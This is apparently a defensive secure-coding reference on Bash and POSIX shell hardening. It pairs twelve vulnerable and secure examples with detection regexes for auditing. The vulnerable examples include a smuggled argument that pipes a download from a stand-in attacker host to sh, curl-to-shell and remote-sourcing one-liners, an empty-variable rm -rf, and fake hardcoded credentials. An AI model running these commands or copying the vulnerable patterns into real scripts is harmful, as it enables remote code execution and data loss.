# Shell Script Security Features and Hardening

Shell scripts glue together deployments, CI pipelines, cron jobs, and provisioning — usually running with elevated privileges and network access. Unlike memory-safe languages, the shell has no type system or taint tracking: every unquoted expansion is a potential word-splitting or injection bug, and every downloaded byte can become executed code. This reference documents the highest-impact vulnerability patterns in POSIX sh and Bash (3.2 through 5.x) with detection regexes for automated auditing.

## Core Shell Security Patterns

### 1. eval on Variables — Command Injection (CWE-78, CWE-95)

`eval` re-parses its arguments as shell code. When any part of that argument comes from a variable — especially one derived from user input, filenames, environment variables, or command output — an attacker controls what the shell executes.

```bash
# VULNERABLE: eval on a variable built from a positional parameter
backup_target="$1"
CMD="tar -czf /backup/site.tgz $backup_target"
eval "$CMD"    # $1 = "; curl evil.example.com/x | sh" executes arbitrary code

# VULNERABLE: eval on unquoted user-supplied filter
eval $FILTER_EXPR

# VULNERABLE: eval on downloaded content — remote code execution in-process
eval "$(curl -fsSL https://get.example.com/env.sh)"

# SECURE: build the command as an array and execute it directly
backup_target="$1"
backup_cmd=(tar -czf /backup/site.tgz -- "$backup_target")
"${backup_cmd[@]}"

# SECURE: dispatch on validated values instead of evaluating strings
case "$ACTION" in
  start|stop|restart) systemctl "$ACTION" app.service ;;
  *) echo "unknown action" >&2; exit 1 ;;
esac
```

**Security implication:** `eval "$var"` gives whoever influences `$var` full shell execution — command substitution, redirection, and chaining all work inside it. Bash arrays (`cmd=(...)` then `"${cmd[@]}"`) preserve argument boundaries and never re-parse metacharacters, eliminating the injection class entirely. If dynamic behavior is needed, whitelist with `case` rather than evaluating strings.

**Detection regex:** `\beval\s+["']?\$\{?[A-Za-z_0-9]|\beval\s+["']?\$\((curl|wget)\b`

*False-positive note:* the regex targets variable expansion (`eval "$CMD"`, `eval $1`, `eval ${EXPR}`) plus command substitution of downloaders (`eval "$(curl ...)"`), and deliberately does not match other `eval "$(...)"` forms, because command substitution of trusted local tools (`eval "$(ssh-agent -s)"`, `eval "$(direnv hook bash)"`, `eval "$(pyenv init -)"`) is a ubiquitous legitimate idiom.

### 2. curl Piped to a Shell — Unverified Remote Code Execution (CWE-494)

Piping a download straight into `sh`/`bash` executes whatever the network returns: a compromised mirror, a MITM'd connection, or a CDN serving truncated content (partial scripts can execute destructive half-commands like `rm -rf /usr /local/bin`).

```bash
# VULNERABLE: classic install one-liner — executes unverified bytes
curl -fsSL https://get.example.com/install.sh | sudo bash

# VULNERABLE: wget variant
wget -qO- https://mirror.example.com/setup.sh | sh

# SECURE: download to a file, verify a pinned checksum, then execute
installer="$(mktemp)"
curl -fsSL -o "$installer" "https://get.example.com/v3.2.1/install.sh"
echo "9f2a4c8e1b7d3f6a0c5e9d2b8f4a7c1e3d6b9f0a2c5e8d1b4f7a0c3e6d9b2f5a  $installer" \
  | sha256sum -c -
sudo bash "$installer"
rm -f "$installer"
```

**Security implication:** The pipe form has no integrity check, no version pinning, and no audit trail — the server can even detect `curl | bash` via read timing and serve different content to pipes than to browsers. Downloading to a file and verifying a checksum (or GPG signature) pinned in your repo turns "trust the network forever" into "trust one reviewed artifact".

**Detection regex:** `\b(curl|wget)\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*\|\s*(sudo\s+)?(bash|sh|zsh)\b`

*False-positive note:* the trailing `\b` requires the piped-to command to be exactly a shell, so piping a download into analysis tools (`curl -fsSL "$SCRIPT_URL" | shellcheck -`, `... | sha256sum`) does not match; the filler class stops at command separators (`;`, `&`) and newlines, so an unrelated pipe later in the script cannot be bridged to an earlier download.

### 3. TLS Certificate Verification Disabled (CWE-295)

`curl -k`/`--insecure` and `wget --no-check-certificate` accept any certificate, silently converting HTTPS into unauthenticated transport. These flags get added to "fix" internal-CA errors and then ship to production.

```bash
# VULNERABLE: -k disables certificate verification entirely
curl -sk https://internal-api.example.com/v1/deploy-token -o token.json

# VULNERABLE: -k anywhere in a flag cluster, e.g. verbose debugging left in
curl -kv https://legacy.example.com/health -o /dev/null

# VULNERABLE: wget equivalent
wget --no-check-certificate https://artifacts.example.com/release.tgz

# SECURE: trust the internal CA explicitly
curl -fsSL --cacert /etc/ssl/certs/internal-ca.pem \
  https://internal-api.example.com/v1/deploy-token -o token.json

# SECURE: wget with an explicit CA bundle
wget --ca-certificate=/etc/ssl/certs/internal-ca.pem \
  https://artifacts.example.com/release.tgz
```

**Security implication:** With verification off, any on-path attacker (rogue Wi-Fi, ARP spoofing, compromised router, malicious proxy) can serve substitute binaries, steal the tokens the script sends, or inject responses. The correct fix for internal CAs is distributing the CA certificate (`--cacert`, `--ca-certificate`, or the system trust store) — never disabling verification.

**Detection regex:** `curl\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*\s-[A-Za-z]*k[A-Za-z]*\b|curl\s+-[A-Za-z]*k[A-Za-z]*\b|curl\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*--insecure\b|wget\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*--no-check-certificate\b`

*False-positive note:* the filler class stops at `;`, `&`, and `|`, so a `-k` cluster in a *different* command chained after the download (`curl -fsSL -o release.gz "$URL" && gzip -dk release.gz`) does not match — only `-k`/`--insecure` inside the curl invocation itself fires.

### 4. SSH Host Key Verification Disabled (CWE-295, CWE-322)

`StrictHostKeyChecking=no` plus `UserKnownHostsFile=/dev/null` makes `ssh`/`scp`/`rsync` accept any host key on every connection — the SSH equivalent of `curl -k`. Common in CI jobs to suppress the "authenticity of host can't be established" prompt.

```bash
# VULNERABLE: accepts any host key — trivially MITM-able
ssh -o StrictHostKeyChecking=no deploy@prod-web-01 "systemctl restart app"
scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \
  release.tgz deploy@prod-web-01:/srv/releases/

# SECURE: provision the host key once, then require it
ssh-keyscan -H prod-web-01 >> /etc/ssh/ssh_known_hosts   # done at image build time
ssh -o StrictHostKeyChecking=yes \
    -o UserKnownHostsFile=/etc/ssh/ssh_known_hosts \
    deploy@prod-web-01 "systemctl restart app"
```

**Security implication:** Host keys are SSH's only server authentication. Disabling the check lets an attacker who controls DNS, ARP, or any network hop present their own key, harvest forwarded credentials/agent sockets, and read or modify everything transferred — including deploy artifacts and secrets. Bake `known_hosts` into images or use SSH certificates (`ssh-keygen -s`); `accept-new` is an acceptable TOFU middle ground for ephemeral hosts, `no` never is.

**Detection regex:** `StrictHostKeyChecking[ =]+no\b|UserKnownHostsFile[ =]+/dev/null`

### 5. Predictable Temp Files (CWE-377, CWE-59)

`/tmp/name.$$` looks unique but PIDs are guessable (and world-readable in `/proc`). On multi-user systems an attacker pre-creates the path — or a symlink at the path — and the script follows it, overwriting arbitrary files with root privileges.

```bash
# VULNERABLE: PID-based temp file — attacker pre-creates a symlink to /etc/passwd
TMPFILE=/tmp/deploy-manifest.$$
generate_manifest > "$TMPFILE"

# VULNERABLE: same pattern in /var/tmp survives reboots
SORTFILE=/var/tmp/report.$$

# SECURE: mktemp creates the file atomically with O_EXCL and mode 0600
TMPFILE="$(mktemp)"
generate_manifest > "$TMPFILE"

# SECURE: private temp directory with cleanup trap
WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT
```

**Security implication:** The gap between "compute the name" and "open the file" is a classic TOCTOU window. `mktemp` eliminates it by creating the file atomically with `O_CREAT|O_EXCL` and owner-only permissions, failing rather than following a pre-planted symlink. Always pair `mktemp -d` with a `trap ... EXIT` cleanup.

**Detection regex:** `/(tmp|var/tmp)/[A-Za-z0-9._-]*\$\$`

### 6. World-Writable Permissions — chmod 777 (CWE-732)

`chmod 777` (or `a+rwx`) makes a path writable by every local user and process. On shared hosts, containers with mounted volumes, or web servers, this converts any low-privilege foothold into code execution or data tampering.

```bash
# VULNERABLE: world-writable web upload directory — any user can plant files
chmod -R 777 /var/www/uploads

# VULNERABLE: world-writable config — any process can rewrite DB credentials
chmod 777 /etc/app/config.ini

# SECURE: least privilege — owner writes, group reads, others nothing
chown -R app:www-data /var/www/uploads
chmod -R 750 /var/www/uploads

# SECURE: config readable only by the service account
install -o app -g app -m 640 config.ini /etc/app/config.ini
```

**Security implication:** World-writable directories allow file planting (later executed by cron, include paths, or PHP), and world-writable files allow direct tampering (credentials, binaries, unit files). Fix the actual ownership problem with `chown`/`chgrp` and grant the minimum mode; `chmod 777` is never the correct answer to a permission error.

**Detection regex:** `chmod\s+(-[A-Za-z]+\s+)*(0?777|a\+rwx)\b`

### 7. Hardcoded Credentials in Scripts (CWE-798)

Literal passwords, API keys, and tokens assigned to variables end up in git history, backups, container layers, and every checkout — and rotating them requires a code change.

```bash
# VULNERABLE: literal secrets committed with the script
DB_PASSWORD="Sup3rS3cretPw2024"
export API_KEY=sk_live_9a8b7c6d5e4f3a2b
DEPLOY_TOKEN='ghp_Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Jh1Gf0De'

# SECURE: require the secret from the environment (injected by CI/orchestrator)
DB_PASSWORD="${DB_PASSWORD:?DB_PASSWORD must be set}"

# SECURE: read from a secrets file with tight permissions (Docker/K8s secrets)
API_KEY="$(cat /run/secrets/api_key)"

# SECURE: fetch from a vault at runtime
DEPLOY_TOKEN="$(vault kv get -field=token secret/ci/deploy)"
```

**Security implication:** A secret in a script is a secret shared with everyone who can read the repo, the artifact, or the image — forever, via history. Environment injection, mounted secret files (`/run/secrets`), and vault lookups keep the secret out of the artifact, enable rotation without redeploys, and give an audit trail of access.

**Detection regex:** `[A-Za-z_]*(PASSWORD|PASSWD|SECRET(_KEY)?|TOKEN|API_KEY|APIKEY|ACCESS_KEY)=["']?[A-Za-z0-9+_.-]{8,}`

*False-positive note:* the variable name must end with the secret keyword. Names that merely contain one — `PASSWORD_FILE=/run/secrets/db_password`, `TOKEN_URL="auth.example.com/oauth"`, `API_KEY_HEADER="X-Api-Key"`, `TOKENIZER_MODEL=bert-base-cased` — hold paths, endpoints, or labels, not credentials, and are intentionally not matched.

### 8. Secrets Echoed to Stdout and Logs (CWE-532)

`echo "connecting with $DB_PASSWORD"` writes the credential into CI logs, journald, `/var/log`, and terminal scrollback — locations with far weaker access control than the secret store, and often shipped to third-party log aggregators.

```bash
# VULNERABLE: secret lands in the CI job log, visible to every project member
echo "Deploying with token $DEPLOY_TOKEN"

# VULNERABLE: secret persisted to a world-readable log file
echo "db password: ${DB_PASSWORD}" >> /var/log/deploy.log

# SECURE: log the event, redact the value
echo "Deploying release ${RELEASE_ID} with token ****"   # log non-secret identifiers only

# SECURE: confirm presence without printing the value
if [ -z "${DB_PASSWORD:-}" ]; then
  echo "ERROR: DB_PASSWORD is not set" >&2
  exit 1
fi
echo "database credentials loaded"
```

**Security implication:** Logs are replicated, retained, indexed, and readable by ops staff, log-pipeline vendors, and anyone who compromises the aggregator — none of whom should hold production credentials. Print identifiers or redacted placeholders; also add `set +x` around secret handling, since `set -x` traces expand variables into stderr.

**Detection regex:** `(echo|printf)\s[A-Za-z0-9_ ="'@:.,%?!#~()+{}$/-]*\$\{?[A-Za-z_]*(PASSWORD|PASSWD|SECRET|TOKEN|API_KEY|APIKEY)\b`

*False-positive note:* the trailing `\b` requires the variable name to end at the keyword, so printing non-secret path/config variables (`echo "loading token from $TOKEN_FILE"`, `echo "secrets dir: $SECRETS_DIR"`) does not match; the filler class is same-line only, so an `echo` on one line cannot be bridged to a legitimate secret *use* (e.g. `deploy --token-stdin <<< "$DEPLOY_TOKEN"`) on a later line.

### 9. Unquoted rm -rf with a Variable Path (CWE-73)

An unquoted variable in `rm -rf $DIR` undergoes word splitting and glob expansion. A value containing spaces deletes unrelated paths; an unset or empty variable turns `rm -rf $DIR/` into `rm -rf /`. This class of bug has destroyed production systems (and, famously, Steam home directories).

```bash
# VULNERABLE: word splitting — DIR="build output" deletes ./build and ./output
rm -rf $RELEASE_DIR/old

# VULNERABLE: empty variable — becomes "rm -rf /" and wipes the filesystem
rm -rf $STAGING_DIR/

# SECURE: quote the expansion and refuse to run when the variable is empty
rm -rf "${RELEASE_DIR:?RELEASE_DIR is not set}/old"

# SECURE: validate before destructive operations
if [ -z "${STAGING_DIR:-}" ] || [ ! -d "$STAGING_DIR" ]; then
  echo "refusing to delete: STAGING_DIR invalid" >&2
  exit 1
fi
rm -rf "${STAGING_DIR:?}/"
```

**Security implication:** Unquoted expansions are the shell's most common correctness-and-security failure: attacker-influenced values (branch names, upload filenames) containing spaces, globs, or leading `-` change what gets deleted. Quoting preserves the value as one argument; `${VAR:?}` aborts the script instead of expanding to nothing; `--` stops option parsing for paths that may start with `-`.

**Detection regex:** `\brm\s+-[A-Za-z]*r[A-Za-z]*\s+(-[A-Za-z]+\s+)*[A-Za-z0-9_./-]*\$`

### 10. Sourcing Remote Content — Process Substitution Execution (CWE-829)

`source <(curl ...)` is `curl | bash` in disguise: it executes network-supplied text in the *current* shell, inheriting and able to modify your environment, functions, and traps — with no integrity check.

```bash
# VULNERABLE: executes whatever the server (or a MITM) returns, in-process
source <(curl -fsSL https://tools.example.com/ci-env.sh)

# VULNERABLE: dot-command variant
. <(wget -qO- https://tools.example.com/aliases.sh)

# SECURE: download, verify against a pinned hash, then source the local file
envfile="$(mktemp)"
curl -fsSL -o "$envfile" https://tools.example.com/v1.4.0/ci-env.sh
echo "3c1f9a7e5d2b8f4a6c0e9d1b7f3a5c8e2d6b0f9a4c7e1d3b5f8a2c6e0d9b1f4a  $envfile" \
  | sha256sum -c -
source "$envfile"
rm -f "$envfile"
```

**Security implication:** Because `source` runs in the current shell, injected code can silently redefine commands (`function sudo { ... }`), exfiltrate every variable, or alter `PATH` for the rest of the script — strictly worse than a piped subshell. Pin a version in the URL, verify a checksum committed to your repo, and only then source the verified local copy.

**Detection regex:** `(^|[^A-Za-z0-9_.])(source|bash|zsh|sh|\.)\s+<\(\s*(curl|wget)\b`

*False-positive note:* the leading guard requires the interpreter word to stand alone, so filenames that merely end in `sh` before a process substitution — e.g. the read-only drift check `diff ci-env.sh <(curl -fsSL "$URL")` — are not matched. Only actual execution (`source`, `.`, `bash`, `zsh`, `sh`) of remote content fires.

### 11. Passwords on the Command Line (CWE-214, CWE-522)

Arguments passed to `mysql -p...`, `psql` connection URLs, and `curl -u user:pass` are visible to every local user via `ps`, `/proc/*/cmdline`, process accounting, and shell history — command lines are not secret storage.

```bash
# VULNERABLE: password visible in ps output and bash history
mysql -h db.example.com -u appuser -pS3cretPw99 inventory -e "SELECT 1"

# VULNERABLE: credential embedded in the connection URL
psql "postgresql://reporter:R3p0rtPass@db.example.com:5432/analytics" -c "SELECT 1"

# VULNERABLE: basic-auth credentials in argv
curl -u admin:hunter2 https://ci.example.com/api/queue

# SECURE: mysql option file readable only by the service user (chmod 600)
mysql --defaults-extra-file=/etc/app/mysql-client.cnf inventory -e "SELECT 1"

# SECURE: psql password file + URL without credentials
export PGPASSFILE=/etc/app/pgpass
psql "postgresql://reporter@db.example.com:5432/analytics" -c "SELECT 1"

# SECURE: curl reads credentials from a netrc file, never argv
curl --netrc-file /etc/app/netrc https://ci.example.com/api/queue
```

**Security implication:** `/proc/<pid>/cmdline` is world-readable on Linux: any unprivileged local process (including a compromised web app on the same host) can poll `ps` and harvest the credential; history files and audit logs persist it. Option files (`.my.cnf`, `.pgpass`, netrc) with `0600` permissions keep credentials out of argv. Avoid `MYSQL_PWD` — MySQL's own documentation flags it as insecure because process environments can leak on some platforms; `PGPASSFILE` and `--defaults-extra-file` are the supported patterns.

**Detection regex:** `mysql[A-Za-z0-9_ ="'@:.,%+/-]*\s(-p[A-Za-z0-9_.!@#%^*+=]|--password=)|psql[A-Za-z0-9_ ="'@:.,%+/-]*://[A-Za-z0-9_.-]+:[A-Za-z0-9_.-]+@|curl\s[A-Za-z0-9_ ="'@:.,%?#~+/-]*-u\s+["']?[A-Za-z0-9_.-]+:[A-Za-z0-9]`

*False-positive note:* `-p` must be immediately followed by a literal password character, so the secure interactive form (`mysql -u readonly analytics -p`, which prompts on the terminal) and variable expansions (`-p"$PW"`) do not match; URLs without a `:pass` segment (`postgresql://reporter@db...`) are likewise ignored.

### 12. find | xargs Without NUL Delimiters (CWE-78, CWE-88)

Newline-delimited `find | xargs` breaks on filenames containing spaces, quotes, or newlines. Since attackers often control filenames (uploads, extracted archives, cloned repos), a crafted name like `important.conf\n/etc/passwd` injects extra arguments into the executed command.

```bash
# VULNERABLE: filename "a b.tmp" becomes two args; embedded newline injects paths
find /srv/uploads -type f -name "*.tmp" -mtime +7 | xargs rm -f

# VULNERABLE: same flaw feeding a mover
find /var/log/app -name "*.gz" | xargs gzip -t

# SECURE: NUL-delimited pipeline — filenames cannot contain NUL
find /srv/uploads -type f -name "*.tmp" -mtime +7 -print0 | xargs -0 rm -f

# SECURE: let find execute directly, one exec for many files
find /var/log/app -name "*.gz" -exec gzip -t {} +
```

**Security implication:** With newline delimiting, an attacker who can create a file named `x\n/etc/shadow` inside the scanned tree gets `/etc/shadow` appended to `rm -f`'s arguments. NUL is the only byte that cannot appear in a Unix path, so `find -print0 | xargs -0` (or `find -exec ... +`, or Bash `while IFS= read -r -d ''`) is the only splitting scheme an attacker cannot influence.

**Detection regex:** `\bfind\s[A-Za-z0-9_ ="'@:.,%!*()+{}$\\/-]*\|\s*xargs\s+(-[A-Za-z]+\s+)*[A-Za-z/]`

*False-positive note:* pipelines whose first `xargs` argument starts with a non-letter (`xargs -0`, `xargs --null`) do not match, and the filler class is same-line only — a `find` used elsewhere in the script cannot be bridged to an unrelated later pipeline such as `git ls-files | xargs shellcheck`.

## Bash Version Security Notes

- **Bash 4.4+** — `${var@Q}` expands a value shell-quoted, safe for logging or re-input: `echo "arg: ${arg@Q}"`. Prefer it over hand-rolled escaping when values must be displayed.
- **Bash 4.0+** — associative arrays enable whitelist dispatch tables; **Bash 4.4+** adds `mapfile -d ''` for NUL-safe file iteration: `mapfile -d '' files < <(find . -print0)`.
- **Bash 4.3+** — `wait -n` waits for the next background job to finish; **Bash 5.0+** adds `EPOCHSECONDS`/`EPOCHREALTIME`, reducing reliance on temp-file coordination and `date` subshells between background jobs.
- **All versions** — start scripts with `set -euo pipefail` and `IFS=$'\n\t'`; use `[[ ]]` over `[ ]` to avoid word splitting inside tests; prefer `printf '%s'` over `echo` for arbitrary data (echo mangles `-n`, `-e`, and backslashes).
- **POSIX sh** — arrays are unavailable; use `set -- arg1 arg2` and `"$@"` to build argument lists safely instead of string concatenation plus `eval`.

## Detection Patterns for Auditing Shell Scripts

| Pattern | Regex | Severity | Checkpoint ID |
|---------|-------|----------|---------------|
| eval on variable | `\beval\s+["']?\$\{?[A-Za-z_0-9]\|\beval\s+["']?\$\((curl\|wget)\b` | error | SA-SH-01 |
| curl/wget piped to shell | `\b(curl\|wget)\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*\\\|\s*(sudo\s+)?(bash\|sh\|zsh)\b` | error | SA-SH-02 |
| TLS verification disabled | `curl\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*\s-[A-Za-z]*k[A-Za-z]*\b\|curl\s+-[A-Za-z]*k[A-Za-z]*\b\|curl\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*--insecure\b\|wget\s[A-Za-z0-9_ ="'@:.,%?#~$+/-]*--no-check-certificate\b` | error | SA-SH-03 |
| SSH host key checks disabled | `StrictHostKeyChecking[ =]+no\b\|UserKnownHostsFile[ =]+/dev/null` | error | SA-SH-04 |
| Predictable temp file | `/(tmp\|var/tmp)/[A-Za-z0-9._-]*\$\$` | warning | SA-SH-05 |
| World-writable chmod | `chmod\s+(-[A-Za-z]+\s+)*(0?777\|a\+rwx)\b` | warning | SA-SH-06 |
| Hardcoded credential | `[A-Za-z_]*(PASSWORD\|PASSWD\|SECRET(_KEY)?\|TOKEN\|API_KEY\|APIKEY\|ACCESS_KEY)=["']?[A-Za-z0-9+_.-]{8,}` | error | SA-SH-07 |
| Secret echoed to logs | `(echo\|printf)\s[A-Za-z0-9_ ="'@:.,%?!#~()+{}$/-]*\$\{?[A-Za-z_]*(PASSWORD\|PASSWD\|SECRET\|TOKEN\|API_KEY\|APIKEY)\b` | error | SA-SH-08 |
| Unquoted rm -rf variable | `\brm\s+-[A-Za-z]*r[A-Za-z]*\s+(-[A-Za-z]+\s+)*[A-Za-z0-9_./-]*\$` | warning | SA-SH-09 |
| Sourcing remote content | `(^\|[^A-Za-z0-9_.])(source\|bash\|zsh\|sh\|\.)\s+<\(\s*(curl\|wget)\b` | error | SA-SH-10 |
| Password on command line | `mysql[A-Za-z0-9_ ="'@:.,%+/-]*\s(-p[A-Za-z0-9_.!@#%^*+=]\|--password=)\|psql[A-Za-z0-9_ ="'@:.,%+/-]*://[A-Za-z0-9_.-]+:[A-Za-z0-9_.-]+@\|curl\s[A-Za-z0-9_ ="'@:.,%?#~+/-]*-u\s+["']?[A-Za-z0-9_.-]+:[A-Za-z0-9]` | error | SA-SH-11 |
| find/xargs without -print0 | `\bfind\s[A-Za-z0-9_ ="'@:.,%!*()+{}$\\/-]*\\\|\s*xargs\s+(-[A-Za-z]+\s+)*[A-Za-z/]` | warning | SA-SH-12 |

## Shell Hardening Checklist

- [ ] Every script starts with `set -euo pipefail` (or `set -eu` for POSIX sh)
- [ ] All variable expansions are double-quoted; `shellcheck` runs in CI with no disabled injection checks
- [ ] No `eval` on data; dynamic commands use arrays or `case` dispatch
- [ ] All downloads pin a version and verify a checksum or signature before execution
- [ ] No `-k`, `--insecure`, `--no-check-certificate`, `StrictHostKeyChecking=no`, or `UserKnownHostsFile=/dev/null` in any script or CI config
- [ ] Temp files and directories come from `mktemp`, with `trap ... EXIT` cleanup
- [ ] No mode wider than 755 for directories or 644 for files without a written justification
- [ ] Secrets arrive via environment injection, `/run/secrets`, or a vault — never literals, argv, or logs
- [ ] Destructive path operations quote and guard variables (`"${VAR:?}"`) and pass `--` before paths
- [ ] File iteration is NUL-delimited (`-print0`/`-0`/`-exec ... +`/`read -d ''`)

## Related References

- `owasp-top10.md` — OWASP Top 10 mapping
- `cwe-top25.md` — CWE Top 25 mapping
- `input-validation.md` — Input validation patterns
- `api-key-encryption.md` — API key storage and encryption patterns

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-07-20 | Initial release | Coverage expansion |
